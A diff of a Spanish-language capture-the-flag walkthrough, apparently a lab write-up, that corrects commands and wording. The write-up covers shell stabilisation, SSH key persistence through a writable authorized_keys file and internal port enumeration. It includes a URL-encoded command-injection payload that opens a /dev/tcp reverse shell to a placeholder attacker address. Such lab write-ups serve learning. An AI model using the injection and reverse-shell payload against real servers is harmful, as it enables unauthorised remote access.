@@ -127,7 +127,7 @@ stty raw -echo ; fg    # Configuramos le terminal y volvemos a la Reverse Shell
 3. Configuraremos las variables de entorno necesarias:
 ```bash
 export TERM=xterm    # Configuramos la variable de entorno TERM
-export PS!="\w$ "    # Configuramos la variable de entorno PS1 (hacer más pequeño el prompt)
+export PS1="\w$ "    # Configuramos la variable de entorno PS1 (hacer más pequeño el prompt)
 ```
 
 ## <font color=red>[~]</font> Escalada de privilegios
@@ -146,11 +146,11 @@ drwxr-xr-x 2 web  web  4096 Jun 30 09:23 .ssh
 -rw-r--r-- 1 web  web    21 Jun 30 09:07 user.txt
 ```
 
-Dentro del subdirectorio `.ssh` encontramos el archivo `authorized_keys` (***Explicación***). al tener permisos de escritura sobre este archivo, podemos crear un par de claves SSH con las que poder acceder al servidor como el usuario `web`.
+Dentro del subdirectorio `.ssh` encontramos el archivo `authorized_keys` (***[Explicación](#authorized_keys)***). Al tener permisos de escritura sobre este archivo, podemos crear un par de claves SSH con las que poder acceder al servidor como el usuario `web`.
 
 1. Creamos las claves en nuestra máquina atacante:
 ```bash
-ssh-keygen -f rsa -t ./id_rsa  # Crea un par de claves (Privada y Pública) RSA, y la guardamos con el nombre id_rsa (id_rsa e id_rsa.pub)
+ssh-keygen -t rsa -f ./id_rsa  # Crea un par de claves (Privada y Pública) RSA, y la guardamos con el nombre id_rsa (id_rsa e id_rsa.pub)
 
 # Cuando nos pidan una clave podemos dar enter para no poner ninguna
 ```
@@ -195,7 +195,7 @@ tcp             LISTEN           0                2048                          
 tcp             LISTEN           0                4096                                       [::]:22                                  [::]:*
 ```
 
-Si analizamos la salida del comando anterior, podemos ver que hay algunos puertos que tan solo son accesibles desde el mismo servidor (***Explicación de Loopback***).
+Si analizamos la salida del comando anterior, podemos ver que hay algunos puertos que tan solo son accesibles desde el mismo servidor.
 
 Los puertos `22` y `80` son los servicios *SSH* y *HTTP* de los cuales ya teníamos conciencia. El puerto `53` pertenece al servicio *DNS*. Por lo que nos quedamos con el resto de puertos (`9000`, `5038`, `3000`, `8088`, `8089`, `8080` y `3306`).
 
@@ -211,7 +211,7 @@ El puerto `3306` es el puerto por defecto del ***Sistema Gestor de Bases de Dato
 Podemos ver que puertos pueden tener servicios interesantes con el siguiente *One-liner* de *Bash*:
 
 ```bash
-for port in 3000 5038 8080 8088 8089 9000; do echo "[+] Probando puerto $port:" ; curl -s -m 3 http://127.0.0.1:$port/ -i | head -c 2 ; echo ; done
+for port in 3000 5038 8080 8088 8089 9000; do echo "[+] Probando puerto $port:" ; curl -s -m 3 http://127.0.0.1:$port/ -i | head -c 200 ; echo ; done
 
 [+] Probando el puerto 3000: 
 HTTP/1.1 200 OK
@@ -262,7 +262,7 @@ Content-Length: 207
 
 - Podemos ver que el puerto `5038` y `8089` no responden, por lo que nos centraremos en el resto de momento.
 - Los puertos `9000` y `8088` han respondido con un código `404 NOT FOUND`. Esto significa que en estos puertos corre un servidor web, pero parece ser necesario conocer rutas específicas ya que no cuentan con un archivo `index.*` que responda automáticamente.
-- Los puertos `3000` y `8080`
+- Los puertos `3000` y `8080` si responden con un código `200 OK`.
 
 #### <font color=red>[!]</font> Puerto `8080`
 
@@ -752,7 +752,7 @@ curl -s -X POST "http://$IP/internal/netcheck" \
 
 ```bash
 curl -s -X POST "http://$IP/internal/netcheck" \
--d "host=10.0.0.5%20%3B%20%2Fbin%2Fbash%20-c%20%27%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FIP_KALI%2F4444%200%3E%261%27""
+-d "host=10.0.0.5%20%3B%20%2Fbin%2Fbash%20-c%20%27%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FIP_KALI%2F4444%200%3E%261%27"
 ```
 
 ## <font color=red>[?]</font> Flujo de ejecución del RCE
@@ -793,7 +793,7 @@ El intérprete de comandos (`/bin/sh` o `/bin/bash`) recibe la cadena completa y
 - Redirige la entrada estándar (`stdin`), la salida estándar (`stdout`) y los errores (`stderr`) a dicho descriptor de archivo de red ( `/dev/tcp/...`).
 - En nuestro *listener* (`nc -lvnp 4444`), recibimos una shell interactiva que se ejecuta con los privilegios del usuario del servidor web (habitualmente `www-data` o `asterisk`).
 
-## <font color=red>[?]</font> `authorized_keys`
+## <font color=red>[?]</font> authorized_keys
 
 >El archivo `authorized_keys` (ubicado habitualmente en `~/.ssh/authorized_keys`) es una lista de confianza utilizada por el servidor SSH para autenticar usuarios mediante ***claves públicas*** en lugar de contraseñas.
 
